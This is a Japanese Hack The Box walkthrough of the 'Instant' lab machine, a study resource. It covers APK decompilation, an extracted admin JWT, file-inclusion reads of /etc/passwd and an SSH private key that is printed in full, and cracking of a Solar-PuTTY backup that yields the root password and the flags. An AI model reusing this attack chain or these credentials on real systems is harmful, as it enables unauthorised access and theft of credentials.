# Instant
Linux · Medium

## 初期調査
### nmap
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ nmap -sC -sV 10.10.11.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 22:22 JST
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.35 seconds
```
分かったこと
- 22/tcp open  ssh
- 80/tcp open  httpが空いている


### 名前解決
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ echo "10.10.11.37 instant.htb" | sudo tee -a /etc/hosts
[sudo] password for kali:
10.10.11.37 instant.htb
```

アクセスしてみる


![](image.png)

ダウンロード押すとinstant.apkが得られる

.apk ファイルはAndroidアプリのパッケージファイル
リバースエンジニアリング可能。
- apktool でデコードし、AndroidManifest.xml を調べる。
- jadx や dex2jar + JD-GUI でソースコードを確認。
- frida や objection を使って動的解析も可能。

作業ディレクトリに移動
```
──(kali㉿kali)-[~/Downloads]
└─$ mv ~/Downloads/instant.apk ~/htb/Machines/Instant 
                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ ls ~/htb/Machines/Instant 
instant.apk  reports
```

中身の確認
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ unzip instant.apk -d apk_contents
Archive:  instant.apk
  inflating: apk_contents/META-INF/com/android/build/gradle/app-metadata.properties  
 extracting: apk_contents/assets/dexopt/baseline.prof  
 extracting: apk_contents/assets/dexopt/baseline.profm  
  inflating: apk_contents/classes.dex  
 extracting: apk_contents/lib/arm64-v8a/libpl_droidsonroids_gif.so  
 extracting: apk_contents/lib/armeabi-v7a/libpl_droidsonroids_gif.so  
 extracting: apk_contents/lib/x86/libpl_droidsonroids_gif.so  
 extracting: apk_contents/lib/x86_64/libpl_droidsonroids_gif.so
```

apktoolで人間が読めるAdminActivities.smaliを手に入れる
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ apktool d instant.apk
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0-dirty on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
                                                                                                                                             
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ ls
apk_contents  instant  instant.apk  reports
```

…/smali/com/instantlabs/instantでなにかadmin関係のものを見つけた
```
┌──(kali㉿kali)-[~/…/smali/com/instantlabs/instant]
└─$ cat AdminActivities.smali 
.class public Lcom/instantlabs/instant/AdminActivities;
.super Ljava/lang/Object;
.source "AdminActivities.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private TestAdminAuthorization()Ljava/lang/String;
    .locals 4

    .line 22
    new-instance v0, Lokhttp3/OkHttpClient;

    invoke-direct {v0}, Lokhttp3/OkHttpClient;-><init>()V

    .line 23
    new-instance v1, Lokhttp3/Request$Builder;

    invoke-direct {v1}, Lokhttp3/Request$Builder;-><init>()V

    const-string v2, "http://mywalletv1.instant.htb/api/v1/view/profile"

    .line 24
    invoke-virtual {v1, v2}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v1

    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

    .line 25
    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v1

    .line 26
    invoke-virtual {v1}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v1

    .line 27
    invoke-virtual {v0, v1}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v0

    new-instance v1, Lcom/instantlabs/instant/AdminActivities$1;

    invoke-direct {v1, p0}, Lcom/instantlabs/instant/AdminActivities$1;-><init>(Lcom/instantlabs/instant/AdminActivities;)V

    invoke-interface {v0, v1}, Lokhttp3/Call;->enqueue(Lokhttp3/Callback;)V

    const-string v0, "Done"

    return-object v0
.end method
```

解析結果

> TestAdminAuthorization()メソッド
・`OkHttpClient` を使って、特定のAPI (`http://mywalletv1.instant.htb/api/v1/view/profile`) にHTTPリクエストを送信している。
・リクエストには、**ハードコードされたJWTトークン** が含まれている
・このトークンは **Base64エンコードされたJWT (JSON Web Token)** であり、デコードすれば管理者 (`Admin`) の権限を持っているかがわかる。
>

### JWTトークンの解析
```
┌──(kali㉿kali)-[~/…/smali/com/instantlabs/instant]
└─$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | cut -d '.' -f2 | base64 -d
{"id":1,"role":"Admin","walId":"f0eca6e5-783a-471d-9d8f-0162cbc900db","exp":33259303656}base64: invalid input
```

JWTのサイトでも可能
https://jwt.io/
![alt text](image-1.png)

分かること

> 管理者権限を持っている

・`"walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db"`これは、特定のユーザーアカウントやウォレットに紐づくIDかもしれない。もし他のAPIエンドポイントがあるなら、`walId` を使ってさらに情報を取得できるかも

・`exp` の値は **33259303656**（Unixタイムスタンプ）普通のUnixタイムは `1700000000` 前後（2023年後半）なので、この値は **数千年後まで有効**
> 

### jadxでリバースエンジニアリング
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ jadx-gui         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
INFO  - Checking for updates... Update channel: STABLE, current version: 1.5.1
INFO  - output directory: instant
INFO  - loading ...
WARN  - Found duplicated class: kotlin.coroutines.jvm.internal.DebugProbesKt, count: 2. Only one will be loaded!
  classes.dex
  instant.apk:DebugProbesKt.bin
INFO  - Loaded classes: 7150, methods: 54193, instructions: 1368613
```
![alt text](image-2.png)

res/xml/にnetwork_security_config.xmlを発見！

2つのサブドメイン発見
> swagger-ui.instant.htb
mywalletv1.instant.htb
> 
を発見

### 名前解決を追加
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ echo "10.10.11.37 mywalletv1.instant.htb" | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.10.11.37 mywalletv1.instant.htb
                                                                                                                                             
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ echo "10.10.11.37 swagger-ui.instant.htb" | sudo tee -a /etc/hosts
10.10.11.37 swagger-ui.instant.htb
```

![alt text](image-3.png)
### **BurpSuite**

① Burp Suite の `Intercept` を OFF にする

もし Burp の [Proxy] → [Intercept] が ON になっていると、全リクエストが止まるため、ページが進まない。

- Burp Suite の [Proxy] → [Intercept] → OFF にする

→ これで解決することが多い！

![alt text](image-4.png)
以下をRequestに追加してsendする
`Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA`


## ディレクトリトラバーサル
ローカルファイルインクルージョン（LFI）を利用して `/etc/passwd` の内容が取得できた

![alt text](image-5.png)
分かること

- root ユーザーが存在
- shirohige という一般ユーザーがいる
    - ホームディレクトリ: /home/shirohige
    - シェル: /bin/bash → ログイン可能
- _laurel というサービスユーザーがいる
    - シェル: /bin/false → ログイン不可
    - ログ保存用のユーザー (/var/log/laurel に関連)

次のアクション

shirohige のパスワードを探す
- /home/shirohige/ に何か重要なファイル (.ssh/, .bash_history, passwd.txt など) があるかも？
- 次は /home/shirohige/.ssh/id_rsa を狙う
`sshd:x:104:65534::/run/sshd:/usr/sbin/nologin`
があるため、
SSH サーバー (sshd) が動作している可能性が高い！
→もし shirohige のパスワードを見つければ SSH でログインできるかも！

![alt text](image-6.png)
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ nano id_rsa
                                                                                                                                             
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### `id_rsa` のパーミッションを変更
SSH のプライベートキーは`600`権限でないと使用できない：
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ chmod 600 id_rsa
```

## SSHログイン
shirohigeで
```
┌──(kali㉿kali)-[~/htb/Machines/Instant]
└─$ ssh shirohige@10.10.11.37 -i id_rsa
The authenticity of host '10.10.11.37 (10.10.11.37)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.37' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ ls
logs  projects  user.txt
shirohige@instant:~$ cat user.txt 
286184282be1b1d93b2973c4ff639033
```
#### user.txt
`286*****************************`

## 権限昇格
低レベルのユーザーであり、'/root' ディレクトリのルートフラグを読み取ることができないので、権限を昇格するか、ルートユーザーの資格情報を取得する方法を探す
```
shirohige@instant:/opt/backups/Solar-PuTTY$ ls
sessions-backup.dat
shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat 
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```
一旦ssh切る

.datが暗号化されているのでcracked.pyを作る

https://github.com/ItsWatchMakerr/SolarPuttyCracker

pycryptodomeインストールする
```
python3 -m venv venv
source venv/bin/activate
pip install pycryptodome
```

sshログインしたときの.datファイルをコピーしておく
```
┌──(venv)─(kali㉿kali)-[~/htb/Machines/Instant]
└─$ cat session-backup.dat 
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

CRACKする
```
┌──(venv)─(kali㉿kali)-[~/htb/Machines/Instant]
└─$ python3 puticracker.py -w /usr/share/wordlists/rockyou.txt session-backup.dat -o cracked.txt 
   ____       __             ___         __   __          _____                 __            
  / __/___   / /___ _ ____  / _ \ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____
 _\ \ / _ \ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  '_// -_)/ __/
/___/ \___//_/ \_,_//_/   /_/    \_,_/ \__/ \__/ \_, /  \___//_/   \_,_/ \__//_/\_\ \__//_/   
                                                /___/                                         
Trying to decrypt using passwords from wordlist...
Decryption successful using password: estrella
[+] DONE Decrypted file is saved in: cracked.txt
                                                                                                                                             
┌──(venv)─(kali㉿kali)-[~/htb/Machines/Instant]
└─$ cat cracked.txt       
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```
分かったこと

> Username": "root",
 Password": "12**24nzC!r0c%q12"
>

rootでログイン
```
┌──(venv)─(kali㉿kali)-[~/htb/Machines/Instant]
└─$ ssh root@10.10.11.37               
Load key "/home/kali/.ssh/id_rsa": error in libcrypto
root@10.10.11.37's password: 
Permission denied, please try again.
root@10.10.11.37's password: 
Permission denied, please try again.
root@10.10.11.37's password: 
```

なぜかできなかったので
*shirohige*でsshし、上記のパスワードを使用してユーザーをrootに切り替えます。
```
┌──(venv)─(kali㉿kali)-[~/htb/Machines/Instant]
└─$ ssh shirohige@10.10.11.37 -i id_rsa                                                         
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Feb 20 15:26:14 2025 from 10.10.14.112
shirohige@instant:~$ su root
Password: 
root@instant:/home/shirohige#
root@instant:/home/shirohige# cd ../../
root@instant:/# ls
bin                boot   dev  home  lib.usr-is-merged  lost+found  mnt  proc  run   sbin.usr-is-merged  srv  tmp  var
bin.usr-is-merged  cdrom  etc  lib   lib64              media       opt  root  sbin  snap                sys  usr
root@instant:/# cd root
root@instant:~# ls
root.txt
root@instant:~# cat root.txt
430e6ed6a04d81c30506637a1e1f333e
```

#### root.txt
`430*****************************`